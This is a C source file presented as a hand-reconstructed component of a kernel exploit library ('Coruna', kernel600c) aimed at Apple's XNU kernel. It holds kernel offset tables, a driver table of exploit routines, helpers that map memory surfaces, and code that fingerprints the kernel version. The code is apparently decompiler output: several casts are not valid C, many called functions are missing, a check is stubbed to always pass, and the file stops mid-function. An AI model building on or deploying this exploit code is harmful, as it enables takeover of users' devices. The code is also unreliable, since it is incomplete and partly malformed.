/*
 * Coruna kernel exploit dylib (kernel600c) — hand-reconstructed native C
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
typedef struct { uint64_t q0; uint64_t q1; } coruna_svc_regpack_t;


static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Kernel module runtime constants (from Mach-O image) */
static uint64_t k_kernel_slot_1001;
static uint64_t k_kernel_slot_1888;
static uint64_t k_kernel_slot_1890;
static uint64_t k_kernel_slot_1898;
static uint64_t k_kernel_slot_18a0;
static uint64_t k_kernel_slot_18a8;
static uint64_t k_kernel_slot_18b0;
static uint64_t k_kernel_slot_18b8;
static uint64_t k_kernel_slot_18c0;
static uint64_t k_kernel_slot_18d0;
static uint64_t k_kernel_slot_18e0;
static uint64_t k_kernel_slot_18e8;
static uint64_t k_kernel_slot_18f0;
static uint64_t k_kernel_slot_18f8;
static uint64_t k_kernel_slot_1900;
static uint64_t k_kernel_slot_1908;
static uint64_t k_kernel_slot_1910;
static uint64_t k_kernel_slot_1914;
static uint64_t k_kernel_slot_1918;
static uint64_t k_kernel_slot_191c;
static uint64_t k_kernel_slot_1920;
static uint64_t k_kernel_slot_1924;
static uint64_t k_kernel_slot_1928;
static uint64_t k_kernel_slot_192c;
static uint64_t k_kernel_slot_1930;
static uint64_t k_kernel_slot_1934;
static uint64_t k_kernel_slot_1938;
static uint64_t k_kernel_slot_193c;
static uint64_t k_kernel_slot_1940;
static uint64_t k_kernel_slot_1944;
static uint64_t k_kernel_slot_1948;
static uint64_t k_kernel_slot_1958;
static uint64_t k_kernel_slot_1960;
static uint64_t k_kernel_slot_1990;
static uint64_t k_kernel_slot_1998;
static uint64_t k_kernel_slot_19a0;
static uint64_t k_kernel_slot_19a8;
static uint64_t k_kernel_slot_19c8;
static uint64_t k_kernel_slot_19d0;
static uint64_t k_kernel_slot_19d8;
static uint64_t k_kernel_slot_19e0;
static uint64_t k_kernel_slot_19e8;
static uint64_t k_kernel_slot_19f0;
static uint64_t k_kernel_slot_19f8;
static uint64_t k_kernel_slot_1a00;
static uint64_t k_kernel_slot_1a08;
static uint64_t k_kernel_slot_1a10;
static uint64_t k_kernel_slot_1a18;
static uint64_t k_kernel_slot_1d08;
static uint64_t k_kernel_slot_1d10;
static uint64_t k_kernel_slot_1d18;
static uint64_t k_kernel_slot_1d20;
static uint64_t k_kernel_slot_1d28;
static uint64_t k_kernel_slot_1d30;
static uint64_t k_kernel_slot_1d38;
static uint64_t k_kernel_slot_1d40;
static uint64_t k_kernel_slot_1d48;
static uint64_t k_kernel_slot_2240;
static uint64_t k_kernel_slot_2710;
static uint64_t k_kernel_slot_4001;
static uint64_t k_kernel_slot_4100;
static uint64_t k_kernel_rodata_word_37400 = 0x0000002800000038ULL;
static uint64_t k_kernel_rodata_word_37408 = 0x0000006000000010ULL;
static uint64_t k_kernel_rodata_word_37410 = 0x0000001000000028ULL;
static uint64_t k_kernel_rodata_word_37418 = 0x0000001800000030ULL;
static uint64_t k_kernel_rodata_word_37420 = 0xeb00011f8b090109ULL;
static uint64_t k_kernel_rodata_word_3745c = 0x0000000100000000ULL;
static uint64_t k_kernel_rodata_word_374c8 = 0x0000000400000001ULL;
static uint64_t k_kernel_rodata_word_374d0 = 0x408f400000000000ULL;
static uint64_t k_kernel_rodata_word_374d8 = 0x00000001beeffeedULL;
static uint64_t k_kernel_rodata_word_374e0 = 0x0013000000000000ULL;
static uint64_t k_kernel_rodata_word_37510 = 0x0000000200000014ULL;
static uint64_t k_kernel_rodata_word_37528 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_37530 = 0x0013000d000b0007ULL;
static uint64_t k_kernel_rodata_word_37730 = 0x0000000040000000ULL;
static uint64_t k_kernel_rodata_word_37738 = 0x0000000200000b36ULL;
static uint64_t k_kernel_rodata_word_37740 = 0x412e848000000000ULL;
static uint64_t k_kernel_rodata_word_37748 = 0x0000007f00000000ULL;
static uint64_t k_kernel_rodata_word_37750 = 0x0000006300000003ULL;
static uint64_t k_kernel_rodata_word_37780 = 0x40dd4c0000000000ULL;
static uint64_t k_kernel_rodata_word_37788 = 0x408c200000000000ULL;
static uint64_t k_kernel_rodata_word_37790 = 0x70000000020cdefaULL;
static uint64_t k_kernel_rodata_word_37798 = 0x0000000400000000ULL;
static uint64_t k_kernel_rodata_word_377a0 = 0x0000002000000014ULL;
static uint64_t k_kernel_rodata_word_377b0 = 0x0000000100000000ULL;
static uint64_t k_kernel_rodata_word_377d0 = 0x408a980000000000ULL;
static uint64_t k_kernel_rodata_word_38858 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_37430 = 0x0000000000420000ULL;
static uint64_t k_kernel_rodata_word_37440 = 0x0000000033000000ULL;
static uint64_t k_kernel_rodata_word_374f0 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_37500 = 0x0000000403020100ULL;
static uint64_t k_kernel_rodata_word_37518 = 0x8000000100000000ULL;
static uint64_t k_kernel_rodata_word_37760 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_37770 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_377c0 = 0x000000d300000007ULL;
static uint64_t k_kernel_rodata_word_377e0 = 0xffff000000000000ULL;
static uint64_t k_kernel_rodata_word_37890 = 0x0000002000000010ULL;
static uint64_t k_kernel_rodata_word_378a0 = 0x0000006000000050ULL;
static uint64_t k_kernel_rodata_word_378b0 = 0x000000e0000000c0ULL;
static uint64_t k_kernel_rodata_word_378c0 = 0x0000019000000170ULL;
static uint64_t k_kernel_rodata_word_378d0 = 0x0000040000000300ULL;
static uint64_t k_kernel_rodata_word_378e0 = 0x0000080000000680ULL;
static uint64_t k_kernel_rodata_word_378ec = 0x0000200000001800ULL;
static void *k_kernel_ndr_record_slot = (void *)0x8010000000000047ULL;
static void *k_kernel_sandbox_check_no_report_slot = (void *)0x8010000000000048ULL;
static void *k_kernel_nsconcretestackblock_slot = (void *)0x801000000000004bULL;
static void *k_kernel_kernelversionstring_slot = (void *)0x801000000000004cULL;
static void *k_kernel_chkstk_darwin_slot = (void *)0x801000000000004dULL;
static void *k_kernel_stack_chk_guard_slot = (void *)0x8010000000000053ULL;
static void *k_kernel_get_cpu_capabilities_slot = (void *)0x8010000000000058ULL;
static void *k_kernel_bootstrap_port_slot = (void *)0x801000000000005aULL;
static void *k_kernel_dyldversionnumber_slot = (void *)0x8010000000000068ULL;
static void *k_kernel_kcfallocatordefault_slot = (void *)0x801000000000007cULL;
static void *k_kernel_kcfallocatornull_slot = (void *)0x801000000000007dULL;
static void *k_kernel_kcfbooleanfalse_slot = (void *)0x801000000000007eULL;
static void *k_kernel_kcfbooleantrue_slot = (void *)0x801000000000007fULL;
static void *k_kernel_kcfrunloopdefaultmode_slot = (void *)0x8010000000000080ULL;
static void *k_kernel_kcftypedictionarykeycallbacks_slot = (void *)0x8010000000000081ULL;
static void *k_kernel_kcftypedictionaryvaluecallbacks_slot = (void *)0x8010000000000082ULL;
static void *k_kernel_kiomasterportdefault_slot = (void *)0x8010000000000083ULL;
static void *k_kernel_mach_task_self_slot = (void *)0x8010000000000092ULL;
static void *k_kernel_vm_kernel_page_mask_slot = (void *)0x8010000000000100ULL;
static void *k_kernel_vm_kernel_page_size_slot = (void *)0x8010000000000101ULL;
static void *k_kernel_vm_page_mask_slot = (void *)0x8010000000000103ULL;
static void *k_kernel_vm_page_shift_slot = (void *)0x8010000000000104ULL;
static void *k_kernel_vm_page_size_slot = (void *)0x8010000000000105ULL;


uint64_t _driver(uint64_t *val)
{
  uint32_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (val != (uint64_t *)0x0) {
    ptr = _calloc(1,0x50);
    if (ptr == (uint32_t *)0x0) {
      u = 0xad009;
    }
    else {
      u = 0;
      *ptr = 0x20002;
      ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_ctx_free_bc88;
      ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_call_helper_19b68;
      ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_call_surface_map_6190;
      ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_kernel29478_via_call_plist_dict_33324;
      ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_call_surface_map;
      ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_driver_copy_port_1918;
      ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_surface_map_range;
      ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_parse_xnu_processors;
      *val = ptr;
    }
  }
  return u;
}





uint64_t coruna_ctx_free_bc88(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_ctx_free_bc8c(uint64_t *val)
{
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return 0;
}





uint64_t coruna_call_helper_19b68(long handle,uint64_t val,uint64_t *id_2)
{
  uint64_t u;
  uint64_t scratch;
  
  scratch = 0;
  u = 0xad001;
  if (((handle != 0) && (id_2 != (uint64_t *)0x0)) &&
     (u = coruna_kernel600c_via_kernel29478_via_vm_allocate(&scratch), (int)u == 0)) {
    *id_2 = scratch;
  }
  return u;
}





uint64_t coruna_kernel29478_via_call_plist_dict_33324(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = coruna_call_plist_dict_33324(addr_2,val);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_call_surface_map(long handle,long addr_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = coruna_mach_thread_self_33f24(addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_call_surface_map_6190(long handle,long addr_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = coruna_pthread_mutex_destroy(addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_copy_port_1918(long handle,long addr_2,int *flags)
{
  uint64_t u;
  
  u = 0xad001;
  if (((handle != 0) && (addr_2 != 0)) && (flags != (int *)0x0)) {
    u = 0xad00a;
    if (1 < *(int *)(&k_kernel_slot_1918 + addr_2) + 1U) {
      *flags = *(int *)(&k_kernel_slot_1918 + addr_2);
      return 0;
    }
  }
  return u;
}





unsigned long coruna_surface_map_range(long arg,long *val,long n,uint m,uint p)

{
  long handle;
  bool err;
  uint u;
  unsigned long size;
  unsigned long version;
  uint64_t *ptr;
  uint port;
  long scratch;
  
  scratch = 0;
  size = 0xad001;
  if ((((arg != 0) && (val != (long *)0x0)) &&
      (((n != 0 && (m != 0)) || ((n == 0 && (m == 0)))))) &&
     ((handle = *val, *val != 0 ||
      (size = (**(void (**)(arg + 0x18))(arg,0,&scratch), handle = scratch, (int)size == 0
      )))) {
    scratch = handle;
    if (m != 0) {
      version = 0;
      size = 1;
      port = 1;
      ptr = (uint64_t *)(n + 8);
      do {
        u = (**(void (**)(arg + 0x28))(arg,scratch,*(uint32_t *)(ptr + -1),*ptr)
        ;
        if (port == 0) {
          u = (uint)version;
        }
        version = (unsigned long)u;
        port = (uint)(u == 0);
        err = size < m;
        size = size + 1;
        ptr = ptr + 2;
      } while ((p | port) == 1 && err);
      if (u != 0) {
        if (*val != 0) {
          return version;
        }
        if ((p & 1) == 0) {
          (**(void (**)(arg + 0x30))(arg,scratch);
        }
        (**(void (**)(arg + 0x20))(arg,scratch);
        return version;
      }
    }
    size = 0;
    *val = scratch;
  }
  return size;
}





void coruna_parse_xnu_processors(long handle,size_t *len)
{
  mach_port_t host;
  kern_return_t lk1;
  int err;
  char *ptr;
  size_t scratch;
  uint32_t bootargs;
  int thread_attr [2];
  char host_info [512];
  
  if (handle == 0) {
    return;
  }
  if (len == (size_t *)0x0) {
    return;
  }
  host_info[0x1e8] = '\0';
  host_info[0x1e9] = '\0';
  host_info[0x1ea] = '\0';
  host_info[0x1eb] = '\0';
  host_info[0x1ec] = '\0';
  host_info[0x1ed] = '\0';
  host_info[0x1ee] = '\0';
  host_info[0x1ef] = '\0';
  host_info[0x1e0] = '\0';
  host_info[0x1e1] = '\0';
  host_info[0x1e2] = '\0';
  host_info[0x1e3] = '\0';
  host_info[0x1e4] = '\0';
  host_info[0x1e5] = '\0';
  host_info[0x1e6] = '\0';
  host_info[0x1e7] = '\0';
  host_info[0x1f8] = '\0';
  host_info[0x1f9] = '\0';
  host_info[0x1fa] = '\0';
  host_info[0x1fb] = '\0';
  host_info[0x1fc] = '\0';
  host_info[0x1fd] = '\0';
  host_info[0x1fe] = '\0';
  host_info[0x1ff] = '\0';
  host_info[0x1f0] = '\0';
  host_info[0x1f1] = '\0';
  host_info[0x1f2] = '\0';
  host_info[499] = '\0';
  host_info[500] = '\0';
  host_info[0x1f5] = '\0';
  host_info[0x1f6] = '\0';
  host_info[0x1f7] = '\0';
  host_info[0x1c8] = '\0';
  host_info[0x1c9] = '\0';
  host_info[0x1ca] = '\0';
  host_info[0x1cb] = '\0';
  host_info[0x1cc] = '\0';
  host_info[0x1cd] = '\0';
  host_info[0x1ce] = '\0';
  host_info[0x1cf] = '\0';
  host_info[0x1c0] = '\0';
  host_info[0x1c1] = '\0';
  host_info[0x1c2] = '\0';
  host_info[0x1c3] = '\0';
  host_info[0x1c4] = '\0';
  host_info[0x1c5] = '\0';
  host_info[0x1c6] = '\0';
  host_info[0x1c7] = '\0';
  host_info[0x1d8] = '\0';
  host_info[0x1d9] = '\0';
  host_info[0x1da] = '\0';
  host_info[0x1db] = '\0';
  host_info[0x1dc] = '\0';
  host_info[0x1dd] = '\0';
  host_info[0x1de] = '\0';
  host_info[0x1df] = '\0';
  host_info[0x1d0] = '\0';
  host_info[0x1d1] = '\0';
  host_info[0x1d2] = '\0';
  host_info[0x1d3] = '\0';
  host_info[0x1d4] = '\0';
  host_info[0x1d5] = '\0';
  host_info[0x1d6] = '\0';
  host_info[0x1d7] = '\0';
  host_info[0x1a8] = '\0';
  host_info[0x1a9] = '\0';
  host_info[0x1aa] = '\0';
  host_info[0x1ab] = '\0';
  host_info[0x1ac] = '\0';
  host_info[0x1ad] = '\0';
  host_info[0x1ae] = '\0';
  host_info[0x1af] = '\0';
  host_info[0x1a0] = '\0';
  host_info[0x1a1] = '\0';
  host_info[0x1a2] = '\0';
  host_info[0x1a3] = '\0';
  host_info[0x1a4] = '\0';
  host_info[0x1a5] = '\0';
  host_info[0x1a6] = '\0';
  host_info[0x1a7] = '\0';
  host_info[0x1b8] = '\0';
  host_info[0x1b9] = '\0';
  host_info[0x1ba] = '\0';
  host_info[0x1bb] = '\0';
  host_info[0x1bc] = '\0';
  host_info[0x1bd] = '\0';
  host_info[0x1be] = '\0';
  host_info[0x1bf] = '\0';
  host_info[0x1b0] = '\0';
  host_info[0x1b1] = '\0';
  host_info[0x1b2] = '\0';
  host_info[0x1b3] = '\0';
  host_info[0x1b4] = '\0';
  host_info[0x1b5] = '\0';
  host_info[0x1b6] = '\0';
  host_info[0x1b7] = '\0';
  host_info[0x188] = '\0';
  host_info[0x189] = '\0';
  host_info[0x18a] = '\0';
  host_info[0x18b] = '\0';
  host_info[0x18c] = '\0';
  host_info[0x18d] = '\0';
  host_info[0x18e] = '\0';
  host_info[399] = '\0';
  host_info[0x180] = '\0';
  host_info[0x181] = '\0';
  host_info[0x182] = '\0';
  host_info[0x183] = '\0';
  host_info[0x184] = '\0';
  host_info[0x185] = '\0';
  host_info[0x186] = '\0';
  host_info[0x187] = '\0';
  host_info[0x198] = '\0';
  host_info[0x199] = '\0';
  host_info[0x19a] = '\0';
  host_info[0x19b] = '\0';
  host_info[0x19c] = '\0';
  host_info[0x19d] = '\0';
  host_info[0x19e] = '\0';
  host_info[0x19f] = '\0';
  host_info[400] = '\0';
  host_info[0x191] = '\0';
  host_info[0x192] = '\0';
  host_info[0x193] = '\0';
  host_info[0x194] = '\0';
  host_info[0x195] = '\0';
  host_info[0x196] = '\0';
  host_info[0x197] = '\0';
  host_info[0x168] = '\0';
  host_info[0x169] = '\0';
  host_info[0x16a] = '\0';
  host_info[0x16b] = '\0';
  host_info[0x16c] = '\0';
  host_info[0x16d] = '\0';
  host_info[0x16e] = '\0';
  host_info[0x16f] = '\0';
  host_info[0x160] = '\0';
  host_info[0x161] = '\0';
  host_info[0x162] = '\0';
  host_info[0x163] = '\0';
  host_info[0x164] = '\0';
  host_info[0x165] = '\0';
  host_info[0x166] = '\0';
  host_info[0x167] = '\0';
  host_info[0x178] = '\0';
  host_info[0x179] = '\0';
  host_info[0x17a] = '\0';
  host_info[0x17b] = '\0';
  host_info[0x17c] = '\0';
  host_info[0x17d] = '\0';
  host_info[0x17e] = '\0';
  host_info[0x17f] = '\0';
  host_info[0x170] = '\0';
  host_info[0x171] = '\0';
  host_info[0x172] = '\0';
  host_info[0x173] = '\0';
  host_info[0x174] = '\0';
  host_info[0x175] = '\0';
  host_info[0x176] = '\0';
  host_info[0x177] = '\0';
  host_info[0x148] = '\0';
  host_info[0x149] = '\0';
  host_info[0x14a] = '\0';
  host_info[0x14b] = '\0';
  host_info[0x14c] = '\0';
  host_info[0x14d] = '\0';
  host_info[0x14e] = '\0';
  host_info[0x14f] = '\0';
  host_info[0x140] = '\0';
  host_info[0x141] = '\0';
  host_info[0x142] = '\0';
  host_info[0x143] = '\0';
  host_info[0x144] = '\0';
  host_info[0x145] = '\0';
  host_info[0x146] = '\0';
  host_info[0x147] = '\0';
  host_info[0x158] = '\0';
  host_info[0x159] = '\0';
  host_info[0x15a] = '\0';
  host_info[0x15b] = '\0';
  host_info[0x15c] = '\0';
  host_info[0x15d] = '\0';
  host_info[0x15e] = '\0';
  host_info[0x15f] = '\0';
  host_info[0x150] = '\0';
  host_info[0x151] = '\0';
  host_info[0x152] = '\0';
  host_info[0x153] = '\0';
  host_info[0x154] = '\0';
  host_info[0x155] = '\0';
  host_info[0x156] = '\0';
  host_info[0x157] = '\0';
  host_info[0x128] = '\0';
  host_info[0x129] = '\0';
  host_info[0x12a] = '\0';
  host_info[299] = '\0';
  host_info[300] = '\0';
  host_info[0x12d] = '\0';
  host_info[0x12e] = '\0';
  host_info[0x12f] = '\0';
  host_info[0x120] = '\0';
  host_info[0x121] = '\0';
  host_info[0x122] = '\0';
  host_info[0x123] = '\0';
  host_info[0x124] = '\0';
  host_info[0x125] = '\0';
  host_info[0x126] = '\0';
  host_info[0x127] = '\0';
  host_info[0x138] = '\0';
  host_info[0x139] = '\0';
  host_info[0x13a] = '\0';
  host_info[0x13b] = '\0';
  host_info[0x13c] = '\0';
  host_info[0x13d] = '\0';
  host_info[0x13e] = '\0';
  host_info[0x13f] = '\0';
  host_info[0x130] = '\0';
  host_info[0x131] = '\0';
  host_info[0x132] = '\0';
  host_info[0x133] = '\0';
  host_info[0x134] = '\0';
  host_info[0x135] = '\0';
  host_info[0x136] = '\0';
  host_info[0x137] = '\0';
  host_info[0x108] = '\0';
  host_info[0x109] = '\0';
  host_info[0x10a] = '\0';
  host_info[0x10b] = '\0';
  host_info[0x10c] = '\0';
  host_info[0x10d] = '\0';
  host_info[0x10e] = '\0';
  host_info[0x10f] = '\0';
  host_info[0x100] = '\0';
  host_info[0x101] = '\0';
  host_info[0x102] = '\0';
  host_info[0x103] = '\0';
  host_info[0x104] = '\0';
  host_info[0x105] = '\0';
  host_info[0x106] = '\0';
  host_info[0x107] = '\0';
  host_info[0x118] = '\0';
  host_info[0x119] = '\0';
  host_info[0x11a] = '\0';
  host_info[0x11b] = '\0';
  host_info[0x11c] = '\0';
  host_info[0x11d] = '\0';
  host_info[0x11e] = '\0';
  host_info[0x11f] = '\0';
  host_info[0x110] = '\0';
  host_info[0x111] = '\0';
  host_info[0x112] = '\0';
  host_info[0x113] = '\0';
  host_info[0x114] = '\0';
  host_info[0x115] = '\0';
  host_info[0x116] = '\0';
  host_info[0x117] = '\0';
  host_info[0xe8] = '\0';
  host_info[0xe9] = '\0';
  host_info[0xea] = '\0';
  host_info[0xeb] = '\0';
  host_info[0xec] = '\0';
  host_info[0xed] = '\0';
  host_info[0xee] = '\0';
  host_info[0xef] = '\0';
  host_info[0xe0] = '\0';
  host_info[0xe1] = '\0';
  host_info[0xe2] = '\0';
  host_info[0xe3] = '\0';
  host_info[0xe4] = '\0';
  host_info[0xe5] = '\0';
  host_info[0xe6] = '\0';
  host_info[0xe7] = '\0';
  host_info[0xf8] = '\0';
  host_info[0xf9] = '\0';
  host_info[0xfa] = '\0';
  host_info[0xfb] = '\0';
  host_info[0xfc] = '\0';
  host_info[0xfd] = '\0';
  host_info[0xfe] = '\0';
  host_info[0xff] = '\0';
  host_info[0xf0] = '\0';
  host_info[0xf1] = '\0';
  host_info[0xf2] = '\0';
  host_info[0xf3] = '\0';
  host_info[0xf4] = '\0';
  host_info[0xf5] = '\0';
  host_info[0xf6] = '\0';
  host_info[0xf7] = '\0';
  host_info[200] = '\0';
  host_info[0xc9] = '\0';
  host_info[0xca] = '\0';
  host_info[0xcb] = '\0';
  host_info[0xcc] = '\0';
  host_info[0xcd] = '\0';
  host_info[0xce] = '\0';
  host_info[0xcf] = '\0';
  host_info[0xc0] = '\0';
  host_info[0xc1] = '\0';
  host_info[0xc2] = '\0';
  host_info[0xc3] = '\0';
  host_info[0xc4] = '\0';
  host_info[0xc5] = '\0';
  host_info[0xc6] = '\0';
  host_info[199] = '\0';
  host_info[0xd8] = '\0';
  host_info[0xd9] = '\0';
  host_info[0xda] = '\0';
  host_info[0xdb] = '\0';
  host_info[0xdc] = '\0';
  host_info[0xdd] = '\0';
  host_info[0xde] = '\0';
  host_info[0xdf] = '\0';
  host_info[0xd0] = '\0';
  host_info[0xd1] = '\0';
  host_info[0xd2] = '\0';
  host_info[0xd3] = '\0';
  host_info[0xd4] = '\0';
  host_info[0xd5] = '\0';
  host_info[0xd6] = '\0';
  host_info[0xd7] = '\0';
  host_info[0xa8] = '\0';
  host_info[0xa9] = '\0';
  host_info[0xaa] = '\0';
  host_info[0xab] = '\0';
  host_info[0xac] = '\0';
  host_info[0xad] = '\0';
  host_info[0xae] = '\0';
  host_info[0xaf] = '\0';
  host_info[0xa0] = '\0';
  host_info[0xa1] = '\0';
  host_info[0xa2] = '\0';
  host_info[0xa3] = '\0';
  host_info[0xa4] = '\0';
  host_info[0xa5] = '\0';
  host_info[0xa6] = '\0';
  host_info[0xa7] = '\0';
  host_info[0xb8] = '\0';
  host_info[0xb9] = '\0';
  host_info[0xba] = '\0';
  host_info[0xbb] = '\0';
  host_info[0xbc] = '\0';
  host_info[0xbd] = '\0';
  host_info[0xbe] = '\0';
  host_info[0xbf] = '\0';
  host_info[0xb0] = '\0';
  host_info[0xb1] = '\0';
  host_info[0xb2] = '\0';
  host_info[0xb3] = '\0';
  host_info[0xb4] = '\0';
  host_info[0xb5] = '\0';
  host_info[0xb6] = '\0';
  host_info[0xb7] = '\0';
  host_info[0x88] = '\0';
  host_info[0x89] = '\0';
  host_info[0x8a] = '\0';
  host_info[0x8b] = '\0';
  host_info[0x8c] = '\0';
  host_info[0x8d] = '\0';
  host_info[0x8e] = '\0';
  host_info[0x8f] = '\0';
  host_info[0x80] = '\0';
  host_info[0x81] = '\0';
  host_info[0x82] = '\0';
  host_info[0x83] = '\0';
  host_info[0x84] = '\0';
  host_info[0x85] = '\0';
  host_info[0x86] = '\0';
  host_info[0x87] = '\0';
  host_info[0x98] = '\0';
  host_info[0x99] = '\0';
  host_info[0x9a] = '\0';
  host_info[0x9b] = '\0';
  host_info[0x9c] = '\0';
  host_info[0x9d] = '\0';
  host_info[0x9e] = '\0';
  host_info[0x9f] = '\0';
  host_info[0x90] = '\0';
  host_info[0x91] = '\0';
  host_info[0x92] = '\0';
  host_info[0x93] = '\0';
  host_info[0x94] = '\0';
  host_info[0x95] = '\0';
  host_info[0x96] = '\0';
  host_info[0x97] = '\0';
  host_info[0x78] = '\0';
  host_info[0x79] = '\0';
  host_info[0x7a] = '\0';
  host_info[0x7b] = '\0';
  host_info[0x7c] = '\0';
  host_info[0x7d] = '\0';
  host_info[0x7e] = '\0';
  host_info[0x7f] = '\0';
  host_info[0x70] = '\0';
  host_info[0x71] = '\0';
  host_info[0x72] = '\0';
  host_info[0x73] = '\0';
  host_info[0x74] = '\0';
  host_info[0x75] = '\0';
  host_info[0x76] = '\0';
  host_info[0x77] = '\0';
  host_info[0x58] = '\0';
  host_info[0x59] = '\0';
  host_info[0x5a] = '\0';
  host_info[0x5b] = '\0';
  host_info[0x5c] = '\0';
  host_info[0x5d] = '\0';
  host_info[0x5e] = '\0';
  host_info[0x5f] = '\0';
  host_info[0x50] = '\0';
  host_info[0x51] = '\0';
  host_info[0x52] = '\0';
  host_info[0x53] = '\0';
  host_info[0x54] = '\0';
  host_info[0x55] = '\0';
  host_info[0x56] = '\0';
  host_info[0x57] = '\0';
  host_info[0x68] = '\0';
  host_info[0x69] = '\0';
  host_info[0x6a] = '\0';
  host_info[0x6b] = '\0';
  host_info[0x6c] = '\0';
  host_info[0x6d] = '\0';
  host_info[0x6e] = '\0';
  host_info[0x6f] = '\0';
  host_info[0x60] = '\0';
  host_info[0x61] = '\0';
  host_info[0x62] = '\0';
  host_info[99] = '\0';
  host_info[100] = '\0';
  host_info[0x65] = '\0';
  host_info[0x66] = '\0';
  host_info[0x67] = '\0';
  host_info[0x38] = '\0';
  host_info[0x39] = '\0';
  host_info[0x3a] = '\0';
  host_info[0x3b] = '\0';
  host_info[0x3c] = '\0';
  host_info[0x3d] = '\0';
  host_info[0x3e] = '\0';
  host_info[0x3f] = '\0';
  host_info[0x30] = '\0';
  host_info[0x31] = '\0';
  host_info[0x32] = '\0';
  host_info[0x33] = '\0';
  host_info[0x34] = '\0';
  host_info[0x35] = '\0';
  host_info[0x36] = '\0';
  host_info[0x37] = '\0';
  host_info[0x48] = '\0';
  host_info[0x49] = '\0';
  host_info[0x4a] = '\0';
  host_info[0x4b] = '\0';
  host_info[0x4c] = '\0';
  host_info[0x4d] = '\0';
  host_info[0x4e] = '\0';
  host_info[0x4f] = '\0';
  host_info[0x40] = '\0';
  host_info[0x41] = '\0';
  host_info[0x42] = '\0';
  host_info[0x43] = '\0';
  host_info[0x44] = '\0';
  host_info[0x45] = '\0';
  host_info[0x46] = '\0';
  host_info[0x47] = '\0';
  host_info[0x18] = '\0';
  host_info[0x19] = '\0';
  host_info[0x1a] = '\0';
  host_info[0x1b] = '\0';
  host_info[0x1c] = '\0';
  host_info[0x1d] = '\0';
  host_info[0x1e] = '\0';
  host_info[0x1f] = '\0';
  host_info[0x10] = '\0';
  host_info[0x11] = '\0';
  host_info[0x12] = '\0';
  host_info[0x13] = '\0';
  host_info[0x14] = '\0';
  host_info[0x15] = '\0';
  host_info[0x16] = '\0';
  host_info[0x17] = '\0';
  host_info[0x28] = '\0';
  host_info[0x29] = '\0';
  host_info[0x2a] = '\0';
  host_info[0x2b] = '\0';
  host_info[0x2c] = '\0';
  host_info[0x2d] = '\0';
  host_info[0x2e] = '\0';
  host_info[0x2f] = '\0';
  host_info[0x20] = '\0';
  host_info[0x21] = '\0';
  host_info[0x22] = '\0';
  host_info[0x23] = '\0';
  host_info[0x24] = '\0';
  host_info[0x25] = '\0';
  host_info[0x26] = '\0';
  host_info[0x27] = '\0';
  host_info[8] = '\0';
  host_info[9] = '\0';
  host_info[10] = '\0';
  host_info[0xb] = '\0';
  host_info[0xc] = '\0';
  host_info[0xd] = '\0';
  host_info[0xe] = '\0';
  host_info[0xf] = '\0';
  host_info[0] = '\0';
  host_info[1] = '\0';
  host_info[2] = '\0';
  host_info[3] = '\0';
  host_info[4] = '\0';
  host_info[5] = '\0';
  host_info[6] = '\0';
  host_info[7] = '\0';
  host = _mach_host_self();
  lk1 = _host_kernel_version(host,host_info);
  if (lk1 != 0) {
    if (lk1 != 0x35) {
      return;
    }
    thread_attr[0] = 1;
    thread_attr[1] = 4;
    scratch = 0x200;
    err = _sysctl(thread_attr,2,host_info,&scratch,(void *)0x0,0);
    if (err != 0) {
      return;
    }
  }
  ptr = _strstr(host_info,"RELEASE");
  if ((ptr != (char *)0x0) && (ptr = _strstr(host_info,"xnu-"), ptr != (char *)0x0)) {
    bootargs = 0;
    scratch = 0;
    err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
    if (err == 3) {
      *len = scratch;
      *(uint32_t *)(len + 1) = bootargs;
    }
  }
  return;
}





uint32_t coruna_pthread_mutexattr_settype(long handle)
{
  pthread_mutexattr_t *ptr;
  int err;
  uint32_t u;
  
